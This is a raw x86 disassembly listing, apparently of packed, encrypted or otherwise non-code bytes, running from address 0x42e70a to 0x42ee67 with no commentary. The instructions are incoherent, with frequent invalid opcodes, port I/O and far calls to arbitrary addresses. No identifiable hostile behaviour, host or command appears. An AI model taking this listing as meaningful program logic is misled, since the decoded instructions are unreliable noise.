  42e70a:	push   es
  42e70b:	out    dx,eax
  42e70c:	and    bh,dl
  42e70e:	pop    ss
  42e70f:	cmc    
  42e710:	push   ecx
  42e711:	rcl    BYTE PTR [ecx-0x4c],1
  42e714:	bound  ebx,QWORD PTR [esi]
  42e716:	addr16 sahf 
  42e718:	call   0x7911:0x99a8b68a
  42e71f:	mov    cl,0xff
  42e721:	mov    cl,0x44
  42e723:	fisttp DWORD PTR [eax-0x5077e4c]
  42e729:	push   0x4a0a8b1b
  42e72e:	in     eax,0xd4
  42e730:	pop    ebp
  42e731:	or     DWORD PTR gs:[ebx],0x5b
  42e735:	arpl   WORD PTR ds:0x348f86d2,ax
  42e73b:	(bad)  
  42e73c:	xchg   esi,eax
  42e73d:	ja     0x42e756
  42e73f:	mov    bh,0xad
  42e741:	jl     0x42e758
  42e743:	add    bh,al
  42e745:	stos   BYTE PTR es:[edi],al
  42e746:	adc    al,0x1f
  42e748:	lds    ecx,FWORD PTR [ebp+0x6f]
  42e74b:	repz mov al,0x6d
  42e74e:	test   al,0xe8
  42e750:	mov    ebx,ds
  42e752:	lods   al,BYTE PTR ds:[esi]
  42e753:	inc    edi
  42e754:	jb     0x42e7c7
  42e756:	inc    ebp
  42e757:	fwait
  42e758:	test   al,0x3e
  42e75a:	mov    cl,0x4
  42e75c:	pop    eax
  42e75d:	test   eax,0x89457098
  42e762:	mov    cl,0xba
  42e764:	ins    DWORD PTR es:[edi],dx
  42e765:	dec    ebp
  42e766:	add    al,bh
  42e768:	or     al,0x77
  42e76a:	sub    al,0x29
  42e76c:	pop    eax
  42e76d:	les    eax,FWORD PTR [ebx]
  42e76f:	mov    dh,0xa0
  42e771:	and    ebx,0x58
  42e774:	and    cl,cl
  42e776:	nop
  42e777:	fdiv   DWORD PTR [esi]
  42e779:	shl    BYTE PTR [esi-0x6f679565],0x8e
  42e780:	sbb    DWORD PTR [ebx],ecx
  42e782:	mov    eax,DWORD PTR es:[ebx]
  42e785:	jno    0x42e730
  42e787:	or     DWORD PTR [ebx],edx
  42e789:	mov    bh,0xec
  42e78b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42e78c:	jb     0x42e752
  42e78e:	dec    edx
  42e78f:	rol    DWORD PTR [edx+0x69],1
  42e792:	mov    DWORD PTR [edx+esi*8+0x58],0xda5d14b6
  42e79a:	ss ss loope 0x42e7a5
  42e79e:	mov    bh,0x37
  42e7a0:	inc    edi
  42e7a1:	mov    ds:0xb57a878c,al
  42e7a6:	jge    0x42e810
  42e7a8:	adc    eax,eax
  42e7aa:	loopne 0x42e7d2
  42e7ac:	inc    ecx
  42e7ad:	xlat   BYTE PTR ds:[ebx]
  42e7ae:	dec    edx
  42e7af:	bound  edi,QWORD PTR [ebx]
  42e7b1:	imul   ecx,DWORD PTR [ebx],0xffffff9f
  42e7b4:	jle    0x42e7f7
  42e7b6:	stos   BYTE PTR es:[edi],al
  42e7b7:	ja     0x42e7c1
  42e7b9:	pop    ss
  42e7ba:	or     BYTE PTR [eax+0x1b9555d1],cl
  42e7c0:	inc    ecx
  42e7c1:	inc    ebx
  42e7c2:	je     0x42e778
  42e7c4:	sbb    BYTE PTR [esi+0xf],dh
  42e7c7:	loop   0x42e74e
  42e7c9:	sub    al,0xb4
  42e7cb:	or     ebx,DWORD PTR [edi]
  42e7cd:	movaps xmm1,xmm0
  42e7d0:	outs   dx,BYTE PTR ds:[esi]
  42e7d1:	mov    ds:0x354146ec,eax
  42e7d6:	adc    DWORD PTR [ebp+eax*2+0x10c4de5e],esi
  42e7dd:	inc    edx
  42e7de:	and    DWORD PTR [eax+0x54],ebp
  42e7e1:	pushf  
  42e7e2:	push   0xdb5b6d94
  42e7e7:	(bad)  
  42e7e8:	xchg   ecx,eax
  42e7e9:	call   0x8eb7084a
  42e7ee:	int3   
  42e7ef:	add    bl,BYTE PTR [ebx+ecx*1+0x6c]
  42e7f3:	sub    BYTE PTR [eax-0x29109eb9],bh
  42e7f9:	add    dl,BYTE PTR [edx-0x7a5a7004]
  42e7ff:	jb     0x42e82c
  42e801:	xchg   bl,bh
  42e803:	xchg   DWORD PTR [edx+ebp*2],ebx
  42e806:	lods   eax,DWORD PTR ds:[esi]
  42e807:	fidiv  DWORD PTR [esi+0x55]
  42e80a:	sar    DWORD PTR [ecx+0x1f],0x13
  42e80e:	ins    BYTE PTR es:[edi],dx
  42e80f:	fwait
  42e810:	sahf   
  42e811:	ret    0x35b
  42e814:	mov    ah,0x23
  42e816:	js     0x42e84c
  42e818:	cmc    
  42e819:	sti    
  42e81a:	stc    
  42e81b:	mov    DWORD PTR [ebx-0x2a],edi
  42e81e:	push   0x536db614
  42e823:	xchg   ebx,eax
  42e824:	dec    esp
  42e825:	fadd   DWORD PTR [ebp-0x3e4b2acb]
  42e82b:	xlat   BYTE PTR ds:[ebx]
  42e82c:	inc    edi
  42e82d:	push   ebp
  42e82e:	stc    
  42e82f:	enter  0xb3d3,0xcb
  42e833:	test   edx,eax
  42e835:	lea    ebp,[ebp-0x48d39d99]
  42e83b:	mov    esi,DWORD PTR [ebx+ebx*2-0x69]
  42e83f:	test   al,0x76
  42e841:	inc    ecx
  42e842:	mov    bh,0x7e
  42e844:	and    edx,DWORD PTR [esp+esi*1-0x271dd14d]
  42e84b:	add    esp,ebx
  42e84d:	mov    edx,0x4068c671
  42e852:	cmp    ebx,DWORD PTR [esi-0x69220f52]
  42e858:	cmp    al,BYTE PTR [edx-0x117f93dd]
  42e85e:	mov    ecx,0x6ea833e2
  42e863:	je     0x42e866
  42e865:	pop    ss
  42e866:	mov    BYTE PTR [esi-0x58],ah
  42e869:	push   esi
  42e86a:	mov    dh,0xa5
  42e86c:	lods   eax,DWORD PTR ds:[esi]
  42e86d:	sbb    DWORD PTR [eax+edx*4],ebp
  42e870:	(bad)  
  42e871:	cmp    eax,0x796e9dc8
  42e876:	sbb    dh,BYTE PTR [edi-0x4813744a]
  42e87c:	jmp    0x1504b3ec
  42e881:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42e882:	push   ebx
  42e883:	inc    eax
  42e884:	ins    BYTE PTR es:[edi],dx
  42e885:	xchg   edi,eax
  42e886:	xlat   BYTE PTR ds:[ebx]
  42e887:	shr    ch,0x23
  42e88a:	out    dx,eax
  42e88b:	pop    ebp
  42e88c:	or     ecx,DWORD PTR [ebp+0x6b595b1b]
  42e892:	or     BYTE PTR [edi],cl
  42e894:	ret    
  42e895:	or     eax,0xbff64609
  42e89a:	mov    edx,0x232cb5b5
  42e89f:	push   eax
  42e8a0:	pusha  
  42e8a1:	sub    BYTE PTR [ecx+0x26],dh
  42e8a4:	je     0x42e8e6
  42e8a6:	pop    edi
  42e8a7:	add    al,bl
  42e8a9:	push   ecx
  42e8aa:	add    al,0x4c
  42e8ac:	push   esp
  42e8ad:	push   es
  42e8ae:	ficom  DWORD PTR [ecx]
  42e8b0:	shl    BYTE PTR [esi-0x669d55e4],1
  42e8b6:	pop    esp
  42e8b7:	inc    BYTE PTR [esp+esi*4]
  42e8ba:	ins    DWORD PTR es:[edi],dx
  42e8bb:	sub    bh,0x66
  42e8be:	loopne 0x42e852
  42e8c0:	mov    dh,0xb
  42e8c2:	mov    ah,0xd0
  42e8c4:	ss push ss
  42e8c6:	lods   eax,DWORD PTR ds:[esi]
  42e8c7:	out    0x5,eax
  42e8c9:	ins    DWORD PTR es:[edi],dx
  42e8ca:	xor    BYTE PTR [ebp+0x4d6e0f89],dl
  42e8d0:	push   esp
  42e8d1:	sar    BYTE PTR [edi+eax*2+0x60a75b68],cl
  42e8d8:	mov    ds:0x21dbdb6d,eax
  42e8dd:	pop    esp
  42e8de:	std    
  42e8df:	lds    eax,FWORD PTR [eax+ebp*2+0x6dc02066]
  42e8e6:	fcmovnu st,st(0)
  42e8e8:	ret    0xa285
  42e8eb:	mov    ds:0xdd200b98,al
  42e8f0:	ins    BYTE PTR es:[edi],dx
  42e8f1:	lea    eax,[esi+0xac30d80]
  42e8f7:	ret    0xe52a
  42e8fa:	leave  
  42e8fb:	mov    al,bl
  42e8fd:	add    eax,0x11c73cdb
  42e902:	ins    DWORD PTR es:[di],dx
  42e904:	imul   edi,DWORD PTR [ebp-0x45c9234a],0x805d6656
  42e90e:	mov    DWORD PTR [edx+0x421776ad],esp
  42e914:	rcl    DWORD PTR [edx*8-0x42cf43a6],1
  42e91b:	push   ebx
  42e91c:	adc    eax,0x2f6a85db
  42e921:	pop    eax
  42e922:	inc    edi
  42e923:	mov    edx,0x2bb011fd
  42e928:	bound  ebx,QWORD PTR [edx]
  42e92a:	aad    0xc2
  42e92c:	xchg   esp,eax
  42e92d:	mul    DWORD PTR [ecx+0x3d1da281]
  42e933:	push   ecx
  42e934:	add    DWORD PTR [edi-0x7d],0x58
  42e938:	inc    eax
  42e939:	pop    ebp
  42e93a:	(bad)  
  42e93b:	jbe    0x42e8de
  42e93d:	cmc    
  42e93e:	cmp    BYTE PTR [ebx+0x0],cl
  42e941:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42e942:	pop    esi
  42e943:	add    BYTE PTR [ebp+eiz*4+0x50],dh
  42e947:	mov    ch,0x8b
  42e949:	mov    BYTE PTR ds:0x83cc3792,bl
  42e94f:	inc    ecx
  42e950:	inc    esp
  42e951:	inc    ebp
  42e952:	pop    ebp
  42e953:	xor    al,0x50
  42e955:	jmp    DWORD PTR [ebp-0x5df455b2]
  42e95b:	or     ecx,DWORD PTR ds:0x6b31755f
  42e961:	inc    ecx
  42e962:	mov    esp,DWORD PTR [edx+0x17]
  42e965:	shr    DWORD PTR [ebp+0x68edd422],1
  42e96b:	xchg   ebx,eax
  42e96c:	add    eax,0xeb741339
  42e971:	add    ch,BYTE PTR [ecx-0x2c2c28ff]
  42e977:	fadd   DWORD PTR [ecx]
  42e979:	cmp    eax,DWORD PTR [edx+0x45f2ac60]
  42e97f:	add    edx,ecx
  42e981:	mov    ds:0x414760ab,eax
  42e986:	mov    dh,0x2c
  42e988:	xor    esi,eax
  42e98a:	test   BYTE PTR [ebp-0x25],ch
  42e98d:	inc    esp
  42e98e:	jno    0x42e984
  42e990:	add    ch,BYTE PTR ds:[ebx+0xc]
  42e994:	and    BYTE PTR [ebp+0xb4bb668],cl
  42e99a:	or     ecx,DWORD PTR [edi+0x8]
  42e99d:	hlt    
  42e99e:	sub    ch,BYTE PTR [eiz*2-0x5e90ac3b]
  42e9a5:	cmp    ch,BYTE PTR [ebp-0x60]
  42e9a8:	dec    ebx
  42e9a9:	pop    ds
  42e9aa:	pop    ebp
  42e9ab:	ret    0xa0c5
  42e9ae:	or     eax,0xce4b6dd4
  42e9b3:	adc    bh,BYTE PTR [ebx-0x43]
  42e9b6:	fiadd  DWORD PTR [esi+0x5b]
  42e9b9:	pop    ss
  42e9ba:	push   esp
  42e9bb:	fwait
  42e9bc:	push   esp
  42e9bd:	push   ebx
  42e9bf:	cmc    
  42e9c0:	add    bl,BYTE PTR [eax+0x26c143ba]
  42e9c6:	mov    ds:0xaab96a5c,al
  42e9cb:	sub    ebx,DWORD PTR [ebx]
  42e9cd:	xadd   BYTE PTR [edx+0x51],al
  42e9d1:	(bad)  
  42e9d2:	ror    DWORD PTR [esi-0x10],1
  42e9d5:	push   esp
  42e9d6:	test   BYTE PTR [eax+0x554a3a8],cl
  42e9dc:	outs   dx,DWORD PTR ds:[esi]
  42e9dd:	iret   
  42e9de:	frstor [eax-0x25]
  42e9e1:	call   0x64b8bce8
  42e9e6:	adc    al,0xb
  42e9e8:	out    0xa4,al
  42e9ea:	arpl   WORD PTR [ecx],sp
  42e9ec:	sbb    BYTE PTR [ebp+0x11],0x45
  42e9f0:	imul   ecx,DWORD PTR [ebp-0x6b],0xab7545da
  42e9f7:	jae    0x42ea72
  42e9f9:	mov    eax,0xe6605016
  42e9fe:	or     eax,0xbf01b015
  42ea03:	fdivr  QWORD PTR [esi]
  42ea05:	outs   dx,DWORD PTR ds:[esi]
  42ea06:	add    BYTE PTR [eax],0x71
  42ea09:	imul   ecx,DWORD PTR [eax-0x4079ea84],0xffffff84
  42ea10:	(bad)  
  42ea11:	stos   BYTE PTR es:[edi],al
  42ea12:	test   DWORD PTR [ebx],ebx
  42ea14:	je     0x42ea19
  42ea16:	sub    cl,bl
  42ea18:	dec    ecx
  42ea19:	ficom  DWORD PTR [ecx-0x52576ad8]
  42ea1f:	or     DWORD PTR [edi],esp
  42ea21:	pop    ecx
  42ea22:	inc    ecx
  42ea23:	fwait
  42ea24:	call   0xb899cad1
  42ea29:	mov    esi,esi
  42ea2b:	xor    eax,0x694adaf
  42ea30:	mov    ch,BYTE PTR [ebp+0x17]
  42ea33:	ins    BYTE PTR es:[edi],dx
  42ea34:	je     0x42ea08
  42ea36:	and    DWORD PTR [eax-0x47accd20],ecx
  42ea3c:	mov    bh,0xad
  42ea3e:	mov    ah,0xa9
  42ea40:	std    
  42ea41:	add    eax,0x3ea11d1c
  42ea46:	in     al,dx
  42ea47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ea48:	inc    edi
  42ea49:	(bad)  [esi+0x6afe685d]
  42ea4f:	leave  
  42ea50:	push   0xcd8c0923
  42ea55:	or     esi,DWORD PTR [ebx]
  42ea57:	mov    eax,ds:0x845535b0
  42ea5c:	push   0x90d6870e
  42ea61:	shl    BYTE PTR [esi+0x34dc4535],0x20
  42ea68:	mov    dl,0xc8
  42ea6a:	cmp    eax,0xb8221add
  42ea6f:	js     0x42ea4a
  42ea71:	js     0x42ea40
  42ea73:	sub    BYTE PTR [ebx],cl
  42ea75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ea76:	cmp    al,0xd4
  42ea78:	cs je  0x42ea7f
  42ea7b:	idiv   BYTE PTR [edi]
  42ea7d:	jmp    0x42eab7
  42ea7f:	ss cmc 
  42ea81:	ins    BYTE PTR es:[edi],dx
  42ea82:	ins    BYTE PTR es:[edi],dx
  42ea83:	jge    0x42ea3f
  42ea85:	jp     0x42eaf5
  42ea87:	cwde   
  42ea88:	enter  0xd426,0x94
  42ea8c:	mov    esp,0xd6e06924
  42ea91:	cs das 
  42ea93:	in     eax,0x56
  42ea95:	add    BYTE PTR [ebp+0x3fbf2b10],cl
  42ea9b:	and    DWORD PTR [esi-0x71],edx
  42ea9e:	mov    ds:0x549c21ad,al
  42eaa3:	xchg   BYTE PTR [eax-0x30],al
  42eaa6:	or     edx,esp
  42eaa8:	inc    ebp
  42eaa9:	aad    0xd1
  42eaab:	call   0x6e9c5d34
  42eab0:	push   0xa50051db
  42eab5:	add    dl,BYTE PTR [eax]
  42eab7:	jge    0x42eaaa
  42eab9:	push   0x8629b057
  42eabe:	push   edi
  42eabf:	xchg   esp,eax
  42eac0:	jmp    0xc1851b39
  42eac5:	adc    eax,0xca988f1b
  42eaca:	dec    ebx
  42eacb:	int3   
  42eacc:	xchg   edi,eax
  42eacd:	push   0x13
  42eacf:	inc    eax
  42ead0:	retf   
  42ead1:	fwait
  42ead2:	shr    BYTE PTR [ecx+edi*1+0x54],1
  42ead6:	sahf   
  42ead7:	add    BYTE PTR [eax+0x20],ch
  42eada:	pop    es
  42eadb:	das    
  42eadc:	push   0x3f
  42eade:	add    eax,DWORD PTR ds:0xe798d8dc
  42eae4:	stos   DWORD PTR es:[edi],eax
  42eae5:	jo     0x42eab2
  42eae7:	mov    ch,0x70
  42eae9:	imul   esi,DWORD PTR [edi-0x3a445053],0xffffffa6
  42eaf0:	cmp    DWORD PTR [ebx-0x29],ebp
  42eaf3:	enter  0x6ba1,0x80
  42eaf7:	jbe    0x42eb4a
  42eaf9:	sub    eax,0x1aaadd0b
  42eafe:	sub    eax,0x52
  42eb01:	sub    ebp,DWORD PTR [edx+0x72]
  42eb04:	repz bound ecx,QWORD PTR [ecx+0x55]
  42eb08:	pop    ebp
  42eb09:	inc    ebp
  42eb0a:	ins    BYTE PTR es:[edi],dx
  42eb0b:	mov    al,ds:0x28d8ceb0
  42eb10:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42eb11:	test   esi,esp
  42eb13:	or     cl,BYTE PTR [eax+0x22c6fbd3]
  42eb19:	shr    DWORD PTR [ebp-0x1e8b7fd7],0x20
  42eb20:	outs   dx,BYTE PTR ds:[esi]
  42eb21:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eb22:	pop    eax
  42eb23:	fisub  DWORD PTR [esi-0x795fbc98]
  42eb29:	in     al,0xef
  42eb2b:	pop    ebp
  42eb2c:	xor    al,0x20
  42eb2e:	add    BYTE PTR [ecx-0x55],dh
  42eb31:	frstor [ebp+0x3]
  42eb34:	out    0xe3,al
  42eb36:	or     eax,0xa3ad4c13
  42eb3b:	fidiv  DWORD PTR [esi-0xd]
  42eb3e:	xchg   edi,eax
  42eb3f:	mov    bh,0x53
  42eb41:	inc    edx
  42eb42:	test   eax,0xd0b6bf9b
  42eb47:	add    ebp,edx
  42eb49:	pop    edi
  42eb4a:	div    BYTE PTR [edx+ecx*2]
  42eb4d:	jbe    0x42eba9
  42eb4f:	repnz push eax
  42eb51:	jno    0x42eb7e
  42eb53:	aad    0x26
  42eb55:	and    BYTE PTR [esi+0x41],dl
  42eb58:	add    DWORD PTR ss:[ecx+eax*1],ebp
  42eb5c:	xor    al,0xe8
  42eb5e:	into   
  42eb5f:	add    ah,bl
  42eb61:	fild   DWORD PTR [esi-0x5ef12496]
  42eb67:	int    0xe3
  42eb69:	js     0x42eb33
  42eb6b:	sub    DWORD PTR [ebp-0x5293e0e0],ecx
  42eb71:	fisubr DWORD PTR [eax+0x7a]
  42eb74:	push   ebx
  42eb76:	xor    al,0x32
  42eb78:	or     eax,0x6e023aaa
  42eb7d:	lahf   
  42eb7e:	xchg   DWORD PTR [edx],edi
  42eb80:	mov    ecx,0x20ed01e0
  42eb85:	push   ss
  42eb86:	pop    esi
  42eb87:	cli    
  42eb88:	mov    bh,0x5
  42eb8a:	mov    esp,0xd1baaba0
  42eb8f:	jns    0x42ebb2
  42eb91:	adc    eax,0x69800aea
  42eb96:	mov    al,ds:0xd505a28e
  42eb9b:	sub    eax,0xa6c44ed3
  42eba0:	mov    BYTE PTR [ebp+0x7c32caf],al
  42eba6:	pop    edi
  42eba7:	jmp    0x42ebc9
  42eba9:	ficom  DWORD PTR [ebp+0x67]
  42ebac:	fidivr DWORD PTR [ebx+eax*4]
  42ebaf:	pop    ebp
  42ebb0:	pop    esp
  42ebb1:	mov    al,ds:0x37441d8
  42ebb6:	repnz adc DWORD PTR ds:0xdc015d7a,eax
  42ebbd:	mov    edx,0xc9a1b069
  42ebc2:	call   0xa5a2:0xa3a3c69b
  42ebc9:	in     al,dx
  42ebca:	mov    eax,ds:0x6ff94b2a
  42ebcf:	xor    eax,0x2a76b715
  42ebd4:	sub    BYTE PTR [esi],ah
  42ebd6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42ebd7:	xor    edx,esi
  42ebd9:	retf   0xe2f9
  42ebdc:	mov    dh,0x2d
  42ebde:	ins    BYTE PTR es:[edi],dx
  42ebdf:	jns    0x42ec50
  42ebe1:	adc    edx,DWORD PTR [eax+0x2f2a74a]
  42ebe7:	push   eax
  42ebe8:	inc    eax
  42ebe9:	pop    esp
  42ebea:	call   0xa8f798f
  42ebef:	cdq    
  42ebf0:	data16 sub al,0x40
  42ebf3:	or     ecx,DWORD PTR [ebp+0xb]
  42ebf6:	pop    esp
  42ebf7:	jg     0x42ec11
  42ebf9:	gs int3 
  42ebfb:	outs   dx,BYTE PTR ds:[esi]
  42ebfc:	pop    ebx
  42ebfd:	pop    es
  42ebfe:	adc    DWORD PTR ds:0xf5844a24,eax
  42ec04:	sub    bl,dl
  42ec06:	mov    dh,BYTE PTR [esi-0x2a402493]
  42ec0c:	ds stos BYTE PTR es:[edi],al
  42ec0e:	adc    DWORD PTR [eax-0x25c9ddd4],esi
  42ec14:	lods   eax,DWORD PTR ds:[esi]
  42ec15:	push   cs
  42ec16:	shr    DWORD PTR [esi-0x36],cl
  42ec19:	sahf   
  42ec1a:	xchg   BYTE PTR [edi-0x6a],dh
  42ec1d:	xchg   ecx,eax
  42ec1e:	(bad)  
  42ec1f:	push   ebp
  42ec20:	add    al,0x17
  42ec22:	cmp    dh,BYTE PTR [ebx+0x2cd26baf]
  42ec28:	call   0x9ea4:0x88ed1ba0
  42ec2f:	xchg   ebx,eax
  42ec30:	loope  0x42ebdb
  42ec32:	shl    dl,cl
  42ec34:	jge    0x42ec91
  42ec36:	xchg   edi,eax
  42ec37:	push   ss
  42ec38:	push   0xffffff98
  42ec3a:	bnd jae 0x42ec05
  42ec3d:	sub    dl,dl
  42ec3f:	repnz test DWORD PTR ds:0x595cdc01,ebx
  42ec46:	push   ebx
  42ec47:	sbb    BYTE PTR [esi],al
  42ec49:	rol    eax,cl
  42ec4b:	or     bh,BYTE PTR [eax+0x96b6ed0]
  42ec51:	mov    dl,0x92
  42ec53:	mov    al,ds:0x17490ff
  42ec58:	fisttp DWORD PTR [esi-0xda531b6]
  42ec5e:	das    
  42ec5f:	ret    
  42ec60:	and    BYTE PTR [esi+0x17],dl
  42ec63:	inc    esp
  42ec64:	dec    ebp
  42ec65:	sbb    al,0xb5
  42ec67:	addr16 (bad) 
  42ec6a:	imul   ebp,DWORD PTR [eax+0x67fdd6e0],0xffffff95
  42ec71:	test   BYTE PTR [edx],0x75
  42ec74:	(bad)  
  42ec75:	outs   dx,BYTE PTR ds:[esi]
  42ec76:	ins    BYTE PTR es:[edi],dx
  42ec77:	sub    eax,0x44779a68
  42ec7c:	push   ebp
  42ec7d:	xor    ecx,DWORD PTR [eax-0x30]
  42ec80:	push   esp
  42ec81:	aam    0xcd
  42ec83:	push   ebp
  42ec84:	addr16 xor eax,0xb0b67395
  42ec8a:	push   esp
  42ec8b:	fsubr  DWORD PTR [eax]
  42ec8d:	gs lahf 
  42ec8f:	call   0xfec2739c
  42ec94:	add    eax,0xed8ae8d8
  42ec99:	jns    0x42ec6c
  42ec9b:	clc    
  42ec9c:	xor    dh,al
  42ec9e:	repnz repz inc edx
  42eca1:	push   ecx
  42eca2:	or     eax,0x52fd5b60
  42eca7:	add    eax,0x17e5f22e
  42ecac:	ss sbb ah,al
  42ecaf:	idiv   BYTE PTR [edi+esi*8]
  42ecb2:	adc    ah,BYTE PTR [eax+0x0]
  42ecb5:	bound  esi,QWORD PTR [ecx-0x7dc568ef]
  42ecbb:	cli    
  42ecbc:	shr    DWORD PTR [esi+ecx*8-0x33],0xde
  42ecc1:	ins    DWORD PTR es:[edi],dx
  42ecc2:	rol    DWORD PTR [eax+0x57],0x91
  42ecc6:	pop    es
  42ecc7:	mov    cl,0x4f
  42ecc9:	or     eax,0x54d1b64a
  42ecce:	aam    0x6c
  42ecd0:	sub    edx,ecx
  42ecd2:	je     0x42ed2e
  42ecd4:	add    BYTE PTR ds:0xd2e0a06b,0x44
  42ecdb:	pop    ss
  42ecdc:	stos   BYTE PTR es:[edi],al
  42ecdd:	out    0x45,al
  42ecdf:	sbb    al,ah
  42ece1:	mov    al,0x35
  42ece3:	adc    DWORD PTR [ecx+0x4c],esi
  42ece6:	mov    ds:0xa0085cd2,eax
  42eceb:	jno    0x42ecd8
  42eced:	sub    bh,BYTE PTR [eax-0x1a80d8d5]
  42ecf3:	stos   BYTE PTR es:[edi],al
  42ecf4:	sub    al,0x61
  42ecf6:	inc    ebx
  42ecf7:	stos   BYTE PTR es:[edi],al
  42ecf8:	mov    eax,0x7f7250d1
  42ecfd:	ret    
  42ecfe:	pop    eax
  42ecff:	push   edi
  42ed00:	shr    BYTE PTR [eax],1
  42ed02:	xchg   esi,eax
  42ed03:	mov    edx,0x5fecf8bd
  42ed08:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed09:	cmp    al,BYTE PTR ss:[edx]
  42ed0c:	mov    eax,0x4002033a
  42ed11:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ed12:	and    al,0x25
  42ed14:	ss push ecx
  42ed16:	jne    0x42ecf3
  42ed18:	ja     0x42ece3
  42ed1a:	xor    dl,BYTE PTR [edx]
  42ed1c:	mov    WORD PTR [esi+0x24],ds
  42ed1f:	jecxz  0x42ecfc
  42ed21:	push   es
  42ed22:	fs and dl,ah
  42ed25:	fld    DWORD PTR [edx-0x29]
  42ed28:	mov    eax,ds:0x10b6d143
  42ed2d:	rcr    BYTE PTR [esi-0x26],0xa2
  42ed31:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed32:	push   eax
  42ed33:	in     eax,dx
  42ed34:	and    ah,BYTE PTR [eax-0x54]
  42ed37:	xchg   DWORD PTR [edx],ecx
  42ed39:	mov    ah,0x6e
  42ed3b:	call   0xaf2d:0x7d36da0a
  42ed42:	inc    ecx
  42ed43:	test   DWORD PTR [ecx-0x2497d979],0xdaa16e0a
  42ed4d:	arpl   WORD PTR [edx-0x3b],si
  42ed50:	ins    DWORD PTR es:[edi],dx
  42ed51:	fcmovnu st,st(2)
  42ed53:	retf   0x683b
  42ed56:	push   eax
  42ed57:	pushf  
  42ed58:	add    eax,0x1b948f40
  42ed5d:	mov    eax,0x4214d1b4
  42ed62:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ed63:	leave  
  42ed64:	xchg   edi,eax
  42ed65:	es sbb eax,0x6d05f8
  42ed6b:	pop    eax
  42ed6c:	jae    0x42ed2e
  42ed6e:	popf   
  42ed6f:	xchg   esi,eax
  42ed70:	pop    ebx
  42ed71:	push   ebp
  42ed72:	aaa    
  42ed73:	push   edi
  42ed74:	sbb    eax,0x868677fa
  42ed79:	ds xchg ecx,eax
  42ed7b:	push   0x85da500b
  42ed80:	dec    esi
  42ed81:	and    edi,esi
  42ed83:	jg     0x42ed90
  42ed85:	add    eax,0x5d11da8a
  42ed8a:	jae    0x42ed9b
  42ed8c:	pushf  
  42ed8d:	lock fcmovne st,st(3)
  42ed90:	push   edx
  42ed91:	inc    ebx
  42ed92:	mov    al,0x6d
  42ed94:	xchg   esp,eax
  42ed95:	push   ss
  42ed96:	(bad)  
  42ed97:	in     al,dx
  42ed98:	fdiv   st,st(5)
  42ed9a:	repnz daa 
  42ed9c:	mov    dh,0x6d
  42ed9e:	sub    al,ch
  42eda0:	xlat   BYTE PTR ds:[ebx]
  42eda1:	xchg   edx,eax
  42eda2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42eda3:	dec    edx
  42eda4:	repnz mov dh,0x12
  42eda7:	add    bl,BYTE PTR ds:0x76db6c00
  42edad:	and    eax,edi
  42edaf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42edb1:	ror    DWORD PTR ds:0x6e8aa689,1
  42edb7:	mov    al,0xee
  42edb9:	and    BYTE PTR [edi],dl
  42edbb:	xchg   ebp,eax
  42edbc:	std    
  42edbd:	cs sub eax,0x6e5368b4
  42edc3:	inc    eax
  42edc4:	mov    dl,0x6e
  42edc6:	cmc    
  42edc7:	lods   eax,DWORD PTR ds:[esi]
  42edc8:	ins    DWORD PTR es:[edi],dx
  42edc9:	sub    eax,0x3d8f942c
  42edce:	push   0x3116d3f7
  42edd3:	retf   
  42edd4:	pop    edi
  42edd5:	pop    eax
  42edd6:	mov    eax,0xa0e179b
  42eddb:	push   eax
  42eddc:	rcl    DWORD PTR [esi+0x0],cl
  42eddf:	dec    edx
  42ede0:	add    DWORD PTR [eax],0x7e
  42ede3:	rcl    DWORD PTR [ecx+esi*4+0x21],1
  42ede7:	mov    dh,BYTE PTR [ecx+0x65]
  42edea:	outs   dx,BYTE PTR ds:[esi]
  42edeb:	push   edx
  42edec:	cmp    ch,BYTE PTR [edx]
  42edee:	loopne 0x42edc6
  42edf0:	scas   eax,DWORD PTR es:[edi]
  42edf1:	popa   
  42edf2:	mov    dh,0x63
  42edf4:	cwde   
  42edf5:	out    dx,eax
  42edf6:	pop    ebx
  42edf7:	pop    esp
  42edf8:	stos   BYTE PTR es:[edi],al
  42edf9:	fstp   st(2)
  42edfb:	ds (bad) 
  42edfd:	fistp  QWORD PTR [ebp+0x45]
  42ee00:	pop    ss
  42ee01:	loope  0x42ee0d
  42ee03:	ds dec ebx
  42ee05:	pop    ebx
  42ee06:	pop    es
  42ee07:	add    eax,0x3db0c090
  42ee0c:	inc    edi
  42ee0d:	or     al,0xb6
  42ee0f:	dec    ebx
  42ee10:	sbb    esi,DWORD PTR [ecx+edx*8-0x5bc9825c]
  42ee17:	add    al,0x95
  42ee19:	es shr DWORD PTR es:[ebp+0x483e008b],1
  42ee21:	cmp    bl,0x6a
  42ee24:	jge    0x42ee06
  42ee26:	inc    edx
  42ee27:	pop    ss
  42ee28:	fistp  DWORD PTR [ecx]
  42ee2a:	add    DWORD PTR [ebx+0x6f154ce],ebp
  42ee30:	or     eax,0xb9addb51
  42ee35:	shr    DWORD PTR [ebx+0x60381a84],1
  42ee3b:	sub    edx,DWORD PTR [esi+0x2c87da0a]
  42ee41:	inc    esi
  42ee42:	mov    ds:0xfffe3ef1,eax
  42ee47:	popa   
  42ee48:	sub    ebp,esp
  42ee4a:	sub    BYTE PTR [edi-0x4cb6cedf],0xd2
  42ee51:	fist   DWORD PTR cs:[eax-0x3f]
  42ee55:	jbe    0x42edf3
  42ee57:	push   ecx
  42ee58:	outs   dx,BYTE PTR ds:[esi]
  42ee59:	daa    
  42ee5a:	pop    ss
  42ee5b:	in     eax,0xd7
  42ee5d:	push   esi
  42ee5e:	jl     0x42ee14
  42ee60:	mov    DWORD PTR [edx+0x35],ebp
  42ee63:	ins    BYTE PTR es:[edi],dx
  42ee64:	mov    BYTE PTR [esi+edx*1],dh
  42ee67:	scas   eax,DWORD PTR es:[edi]
